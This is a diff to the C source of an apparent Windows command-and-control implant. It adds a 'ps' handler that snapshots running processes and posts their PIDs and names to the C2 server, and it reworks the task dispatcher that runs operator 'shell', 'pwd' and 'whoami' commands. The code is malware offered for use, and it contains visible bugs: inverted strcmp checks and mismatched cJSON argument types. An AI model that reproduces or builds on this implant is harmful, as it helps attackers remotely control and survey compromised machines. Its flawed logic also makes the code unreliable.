@@ -5,6 +5,7 @@
 #include <stdbool.h>
 #include <stdio.h>
 #include <string.h>
+#include <tlhelp32.h>
 #include "cJSON.h"
 
 
@@ -15,7 +16,7 @@ bool sleep_with_jitter(int interval, int jitter);
 void get_tasks();
 void checkin();
 char* send_c2_post_request(char* json_data);
-
+void handle_ps_cmd(cJSON *task);
 
 typedef struct {
     int port; 
@@ -162,7 +163,7 @@ strncpy(ret_val,output,read+1);
 return ret_val;
 }
 
-char* handle_pwd_cmd(cJSON *task){
+char* handle_pwd_cmd(/*cJSON *task*/){
      char output[260];
      size_t read = 0;
      read = GetCurrentDirectoryA(260,output);
@@ -177,10 +178,10 @@ char* handle_pwd_cmd(cJSON *task){
 
 }
 
-char* handle_whoami_cmd(cJSON *task){
+char* handle_whoami_cmd(/*cJSON *task*/){
      char output[21];
-     size_t read = 21;
-     GetUserNameA(output,read);
+     long unsigned int read = 21;
+     GetUserNameA(output,&read);
      if(read){
         char* ret_val = (char*)malloc(read);
         strncpy(ret_val,output,read);
@@ -192,27 +193,31 @@ char* handle_whoami_cmd(cJSON *task){
 
 }
 
-typedef struct ProcessInfo{
-    char szExeFile[260];
-    int th32ParentProcessID;
-    int th32ProcessID;
-}
+//typedef struct ProcessInfo{
+//    char szExeFile[260];
+//    int th32ParentProcessID;
+//    int th32ProcessID;
+//};
 
 void dispatcher(cJSON *task){
+    char* command_output;
     if (strcmp(cJSON_GetObjectItemCaseSensitive(task, "cmd")->valuestring,"shell")){
-        char* command_output = handle_shell_cmd(task);
+        command_output = handle_shell_cmd(task);
     }
-    if (strcmp(cJSON_GetObjectItemCaseSensitive(task, "cmd")->valuestring,"pwd")){
-         char* command_output = handle_pwd_cmd(task);
+    else if (strcmp(cJSON_GetObjectItemCaseSensitive(task, "cmd")->valuestring,"pwd")){
+         command_output = handle_pwd_cmd(task);
 
     }
-    if (strcmp(cJSON_GetObjectItemCaseSensitive(task, "cmd")->valuestring,"whoami")){
-        char* command_output = handle_whoami_cmd(task);
+    else if (strcmp(cJSON_GetObjectItemCaseSensitive(task, "cmd")->valuestring,"whoami")){
+         command_output = handle_whoami_cmd(task);
     }
-    if (strcmp(cJSON_GetObjectItemCaseSensitive(task, "cmd")->valuestring,"ps")){
+    else if (strcmp(cJSON_GetObjectItemCaseSensitive(task, "cmd")->valuestring,"ps")){
+         handle_ps_cmd(task);
 
-
-    }
+    } else{
+        printf(":( unknown command:\n");
+            puts(cJSON_GetObjectItemCaseSensitive(task, "cmd")->valuestring);
+    };
 
         cJSON *root = cJSON_CreateObject();
         cJSON_AddStringToObject(root,"action","post_response");
@@ -232,20 +237,17 @@ void dispatcher(cJSON *task){
     
 
     
-    else{
-        printf(":( unknown command:\n");
-            puts(cJSON_GetObjectItemCaseSensitive(task, "cmd")->valuestring);
-    }
+   
 
 }
 
-char* handle_ps_cmd(cJSON *task){
+void handle_ps_cmd(cJSON *task){
      HANDLE han = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
      if(han == INVALID_HANDLE_VALUE) {
 
         char* ret_val = (char*)malloc(17);
         strncpy(ret_val,"failed to get ps\0",17);
-        return(ret_val);
+        return;
     }
 
      PROCESSENTRY32 proces;
@@ -260,25 +262,28 @@ char* handle_ps_cmd(cJSON *task){
         cJSON_AddItemToObject(root,"responses",arr);
         cJSON_AddStringToObject(obj,"status","processing");
         cJSON_AddBoolToObject(obj,"completed",0);
-        cJSON_AddItemToObject(obj,"task_id",cJSON_GetObjectItemCaseSensitive(task, "id")->valuestring);
+        char task_id[37];
+        strncpy(task_id,cJSON_GetObjectItemCaseSensitive(task, "id")->valuestring,37);
+        cJSON_AddItemToObject(obj,"task_id",task_id);
         cJSON_AddItemToArray(arr,user_input_p);
 
-char* odpowiedz;
     unsigned char counter = 0;
-    char[1108] buff = {'\0'};
-    char[272] process_buff = {'\0'};
+    char buff[1108];
+    char process_buff[272] = {'\0'};
             snprintf(buff,1108,"PID;PPID;szExeFile\n");
 
  if(Process32First(han,&proces)){
      do{
         
-        snprintf(process_buff,272,"%d;%d;%s\n",proces.th32ProcessID,proces.th32ParentProcessID,proces.szExeFile);
+        snprintf(process_buff,272,"%ld;%ld;%s\n",proces.th32ProcessID,proces.th32ParentProcessID,proces.szExeFile);
             strncat(buff,process_buff,272);
         counter++;
         if(counter>=4){
             cJSON_AddStringToObject(user_input_p,"user_output",buff);
-            odpowiedz = send_c2_post_request(root);
-             //TODO: handle the answer 
+            char* sent = cJSON_PrintUnformatted(root);
+            send_c2_post_request(sent);
+            free(sent);
+             //TODO: somehow handle the answer 
             cJSON_DeleteItemFromObject(user_input_p, "user_output");
             user_input_p = cJSON_CreateObject();
             cJSON_AddItemToArray(arr,user_input_p);
@@ -290,12 +295,14 @@ char* odpowiedz;
  }
 
 cJSON *statusik = cJSON_GetObjectItemCaseSensitive(obj,"status");
-cJSON_SetValueString(statusik,"success");
+cJSON_SetValuestring(statusik,"success");
 //cJSON_DeleteItemFromObject(cJSON_GetObjectItemCaseSensitive(obj,"user_output"),);
-send_c2_post_request(root);
+char* unformatted_buff = cJSON_PrintUnformatted(root);
+send_c2_post_request(unformatted_buff);
 cJSON_Delete(root);
 CloseHandle(han);
-return odpowiedz;
+free(unformatted_buff);
+return;
 }
 
 int main(){
